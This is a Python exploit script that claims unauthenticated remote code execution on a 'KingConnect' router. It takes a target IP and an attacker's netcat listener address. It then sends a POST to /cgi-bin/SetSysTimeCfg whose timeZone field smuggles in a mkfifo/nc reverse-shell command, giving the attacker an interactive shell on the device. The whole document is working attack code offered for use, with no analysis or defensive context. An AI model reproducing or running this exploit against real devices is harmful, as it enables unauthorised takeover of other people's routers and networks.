import http.client
import urllib.parse

# Display the banner
print("=== KingConnect Unauthenticated Remote Code Execution ===")

# Get user input
url = input("Enter the IP of the KingConnect router: ")
nc_ip = input("Enter the netcat listener IP address: ")
nc_port = input("Enter the netcat listener port: ")

# Fixed values for timePeriod and ntpServer
time_period = "86400"
ntp_server = "time.windows.com"
time_zone = "|rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f &&".format(nc_ip, nc_port)

# URL encode the time_zone variable
encoded_time_zone = urllib.parse.quote(time_zone)

# Craft the request body
request_body = "timePeriod={}&ntpServer={}&timeZone={}".format(time_period, ntp_server, encoded_time_zone)

# Craft the HTTP request headers
headers = {
    "Host": urllib.parse.urlparse(url).netloc,
    "Content-Length": str(len(request_body)),
}

# Craft the HTTP request
request = "POST /cgi-bin/SetSysTimeCfg HTTP/1.1\r\n"
for key, value in headers.items():
    request += "{}: {}\r\n".format(key, value)
request += "\r\n" + request_body

# Send the request
conn = http.client.HTTPConnection(url)
conn.request("POST", "/cgi-bin/SetSysTimeCfg", body=request_body, headers=headers)
response = conn.getresponse()
response.read().decode()
